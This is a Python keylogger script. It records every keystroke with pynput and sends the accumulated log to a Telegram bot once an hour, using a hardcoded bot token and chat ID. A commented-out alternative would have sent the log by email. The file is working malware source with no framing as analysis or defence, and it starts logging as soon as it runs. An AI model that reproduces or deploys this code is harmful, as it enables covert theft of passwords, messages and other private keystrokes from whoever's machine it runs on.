import pynput.keyboard # This library allows to monitor mouse clicks and keyboard strokes.
import threading
from urllib.request import urlopen, Request
import urllib.parse

class Keylogger:
    def __init__(self, interval, email, password):
        self.log = 'Keylogger Started...'
        self.interval = interval
        self.email = email
        self.password = password

    def append_to_key(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' [' + str(key) + '] '
        self.append_to_key(current_key)

    def report(self):
        MessageURL_bot = str('https://api.telegram.org/bot5790947499:AAF7Svc-L1HknSWIPyCo63isRpzbw3L8bOw/sendMessage?chat_id=583385862&text=' + urllib.parse.quote_plus('\n\n') + urllib.parse.quote_plus(self.log))
        urlopen(Request(url=MessageURL_bot))
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # def send_mail(self, email, password, message):
    #     server = smtplib.SMTP('smtp.office365.com', 587)
    #     server.starttls()
    #     server.login(email, password)
    #     server.sendmail(email, email, message)
    #     server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        try:
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
        except KeyboardInterrupt:
            print('\nExiting program')
            
my_keylogger = Keylogger(3600, "example@mail.com", "password")
my_keylogger.start()